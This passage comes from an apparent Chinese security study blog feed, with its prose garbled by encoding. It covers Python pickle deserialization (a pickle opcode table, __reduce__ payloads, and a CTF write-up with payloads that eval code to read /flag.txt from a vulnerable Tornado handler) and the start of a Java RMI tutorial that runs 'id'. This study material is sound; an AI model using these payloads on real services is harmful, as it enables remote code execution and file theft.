class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rc</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">&quot;echo &#x27;hello world&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> os.system,(shell,)</span><br><span class="line"></span><br><span class="line">a=Rc()</span><br><span class="line">pi=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pi)</span><br><span class="line"><span class="built_in">print</span>(pickle.loads(pi))</span><br></pre></td></tr></table></figure><h3 id="æ‰‹åŠ¨ç¼–å†™opcode"><a href="#æ‰‹åŠ¨ç¼–å†™opcode" class="headerlink" title="æ‰‹åŠ¨ç¼–å†™opcode"></a>æ‰‹åŠ¨ç¼–å†™opcode</h3><p>reduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œå½“execè¢«ç¦ï¼Œå°±ä¸èƒ½ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªæŒ‡ä»¤</p><table><thead><tr><th>opcode</th><th>æè¿°</th><th>å…·ä½“å†™æ³•</th><th>æ ˆä¸Šçš„å˜åŒ–</th><th align="center">memoä¸Šçš„å˜åŒ–</th></tr></thead><tbody><tr><td>c</td><td>è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰</td><td>c[module]\n[instance]\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>o</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>o</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>i</td><td>ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰</td><td>i[module]\n[callable]\n</td><td>è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>N</td><td>å®ä¾‹åŒ–ä¸€ä¸ªNone</td><td>N</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>S</td><td>å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡</td><td>Sâ€™xxxâ€™\nï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€&#39;ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>V</td><td>å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡</td><td>Vxxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>I</td><td>å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡</td><td>Ixxx\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>F</td><td>å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡</td><td>Fx.x\n</td><td>è·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>R</td><td>é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°</td><td>R</td><td>å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>.</td><td>ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼</td><td>.</td><td>æ— </td><td align="center">æ— </td></tr><tr><td>(</td><td>å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®°</td><td>(</td><td>MARKæ ‡è®°å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>t</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„</td><td>t</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>)</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„</td><td>)</td><td>ç©ºå…ƒç»„å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>l</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨</td><td>l</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>]</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨</td><td>]</td><td>ç©ºåˆ—è¡¨å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>d</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰</td><td>d</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>}</td><td>å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸</td><td>}</td><td>ç©ºå­—å…¸å…¥æ ˆ</td><td align="center">æ— </td></tr><tr><td>p</td><td>å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n</td><td>pn\n</td><td>æ— </td><td align="center">å¯¹è±¡è¢«å‚¨å­˜</td></tr><tr><td>g</td><td>å°†memo_nçš„å¯¹è±¡å‹æ ˆ</td><td>gn\n</td><td>å¯¹è±¡è¢«å‹æ ˆ</td><td align="center">æ— </td></tr><tr><td>0</td><td>ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡</td><td>0</td><td>æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ</td><td align="center">æ— </td></tr><tr><td>b</td><td>ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®</td><td>b</td><td>æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ</td><td align="center">æ— </td></tr><tr><td>s</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­</td><td>s</td><td>ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–°</td><td align="center">æ— </td></tr><tr><td>u</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­</td><td>u</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–°</td><td align="center">æ— </td></tr><tr><td>a</td><td>å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td><td>a</td><td>æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td><td align="center">æ— </td></tr><tr><td>e</td><td>å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td><td>e</td><td>MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td><td align="center">æ— </td></tr></tbody></table><p>æ³¨æ„ï¼š<code>c</code>æ“ä½œç¬¦ä¼šå°è¯•<code>import</code>åº“ï¼Œæ‰€ä»¥åœ¨<code>pickle.loads</code>æ—¶ä¸éœ€è¦æ¼æ´ä»£ç ä¸­å…ˆå¼•å…¥ç³»ç»Ÿåº“</p><p>ç»å¸¸ä½¿ç”¨çš„<code>R</code> ,<code>O</code>,<code>i</code></p><h4 id="å˜é‡è¦†ç›–-1"><a href="#å˜é‡è¦†ç›–-1" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,test</span>):</span></span><br><span class="line">        self.test=test</span><br><span class="line">        <span class="built_in">print</span>(self.test)</span><br><span class="line"></span><br><span class="line"><span class="comment">#R</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># (S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># tR.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#O</span></span><br><span class="line"><span class="comment"># p=b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="comment"># Test</span></span><br><span class="line"><span class="comment"># S&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># o.</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#I</span></span><br><span class="line">p=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;hello&#x27;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Test</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">he=pickle.loads(p)</span><br><span class="line"><span class="built_in">print</span>(he.test)</span><br></pre></td></tr></table></figure><h4 id="ctf-ikun"><a href="#ctf-ikun" class="headerlink" title="ctf ikun"></a>ctf ikun</h4><p>éƒ¨åˆ†ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="æ‰‹å†™ç‰ˆ"><a href="#æ‰‹å†™ç‰ˆ" class="headerlink" title="æ‰‹å†™ç‰ˆ"></a>æ‰‹å†™ç‰ˆ</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">(S&#x27;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&#x27;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pi))</span><br></pre></td></tr></table></figure><h6 id="ä»£ç ç‰ˆ"><a href="#ä»£ç ç‰ˆ" class="headerlink" title="ä»£ç ç‰ˆ"></a>ä»£ç ç‰ˆ</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        shell=<span class="string">b&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>,(shell,)</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(AdminHandler()))</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pickle.dumps(AdminHandler())))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java å­¦ä¹ æ—¥ç¨‹ï¼ˆäºŒï¼‰</title>
      <link href="/2021/10/31/java_study/java_day2/"/>
      <url>/2021/10/31/java_study/java_day2/</url>
      
        <content type="html"><![CDATA[<h2 id="day2â€”java-RMI"><a href="#day2â€”java-RMI" class="headerlink" title="day2â€”java_RMI"></a>day2â€”java_RMI</h2><h3 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h3><h4 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h4><p>ä¸€ä¸ªinterfaceï¼ˆæŠ½è±¡æ–¹æ³•ï¼‰ï¼Œè¯¥interfaceä¸­æ²¡æœ‰ç”³æ˜ä»»ä½•æ–¹æ³•ï¼Œä½†æ˜¯åªæœ‰ç»§æ‰¿è¯¥æ¥å£æ‰å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rmi</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="RemoteException"><a href="#RemoteException" class="headerlink" title="RemoteException"></a>RemoteException</h4><p>RemoteExceptionæ˜¯æ‰€æœ‰åœ¨è¿œç¨‹è°ƒç”¨ä¸­æ‰€æŠ›å‡ºå¼‚å¸¸çš„è¶…ç±»ï¼Œæ‰€æœ‰èƒ½å¤Ÿè¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•å£°æ˜ï¼Œéƒ½éœ€è¦æŠ›å‡ºæ­¤å¼‚å¸¸</p><h4 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h4><p>æä¾›å‘æ³¨å†Œä¸­å¿ƒä¿å­˜è¿œç¨‹å¯¹è±¡å¼•ç”¨æˆ–è€…ä»æ³¨å†Œä¸­å¿ƒè·å–è¿œç¨‹å¯¹è±¡å¼•ç”¨çš„æ–¹æ³•ã€‚è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•éƒ½æ˜¯é™æ€æ–¹æ³•ï¼Œæ¯ä¸€ä¸ªæ–¹æ³•éƒ½åŒ…å«äº†ä¸€ä¸ªç±»å‹ä¸ºStringçš„nameå‚æ•°, è¿™ä¸ªå‚æ•°æ˜¯URLæ ¼å¼ï¼Œå½¢å¦‚:<code>//host:port/name</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/rmi&quot;</span>);</span><br><span class="line">        String hello = rmi.hello();</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h4><p>ä¸€ä¸ªinterface, å…¶åŠŸèƒ½å’Œ<code>Naming</code>ç±»ä¼¼ï¼Œæ¯ä¸ªæ–¹æ³•éƒ½æœ‰ä¸€ä¸ªStringç±»å‹çš„nameå‚æ•°ï¼Œä½†æ˜¯è¿™ä¸ªnameä¸æ˜¯URLæ ¼å¼ï¼Œæ˜¯è¿œç¨‹å¯¹è±¡çš„ä¸€ä¸ªå‘½åã€‚Registryçš„å®ä¾‹å¯ä»¥é€šè¿‡æ–¹æ³•<code>LocateRegistry.getRegistry()</code>è·å¾—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        Rmi rmi1 = (Rmi) registry.lookup(<span class="string">&quot;rmi&quot;</span>);</span><br><span class="line">        System.out.println(rmi1.hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LocateRegistry"><a href="#LocateRegistry" class="headerlink" title="LocateRegistry"></a>LocateRegistry</h4><p>ç”¨äºè·å–åˆ°æ³¨å†Œä¸­å¿ƒçš„ä¸€ä¸ªè¿æ¥ï¼Œè¿™ä¸ªè¿æ¥å¯ä»¥ç”¨äºè·å–ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªæ³¨å†Œä¸­å¿ƒã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br></pre></td></tr></table></figure><h4 id="RemoteObject"><a href="#RemoteObject" class="headerlink" title="RemoteObject"></a>RemoteObject</h4><p>é‡æ–°è¦†å†™äº†<code>Object</code>å¯¹è±¡ä¸­çš„equals,hashCode,toStringæ–¹æ³•ï¼Œä»è€Œå¯ä»¥ç”¨äºè¿œç¨‹è°ƒç”¨</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p>ç”¨äºRMI Serverä¸­å¯¼å‡ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡å¹¶è·å¾—ä¸€ä¸ªstubã€‚è¿™ä¸ªstubå°è£…äº†åº•å±‚ç»†èŠ‚ï¼Œç”¨äºå’Œè¿œç¨‹å¯¹è±¡è¿›è¡Œé€šä¿¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloworld</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Rmi</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InputStream in = runtime.exec(<span class="string">&quot;id&quot;</span>).getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        in.read(bytes);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteHelloworld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Unreferenced"><a href="#Unreferenced" class="headerlink" title="Unreferenced"></a>Unreferenced</h4><p>ä¸€ä¸ªinterface, å£°æ˜äº†æ–¹æ³•ï¼š<code>void unreferenced()</code>å¦‚æœä¸€ä¸ªè¿œç¨‹å¯¹è±¡å®ç°äº†æ­¤æ¥å£ï¼Œåˆ™è¿™ä¸ªè¿œç¨‹å¯¹è±¡åœ¨æ²¡æœ‰ä»»ä½•å®¢æˆ·ç«¯å¼•ç”¨çš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" 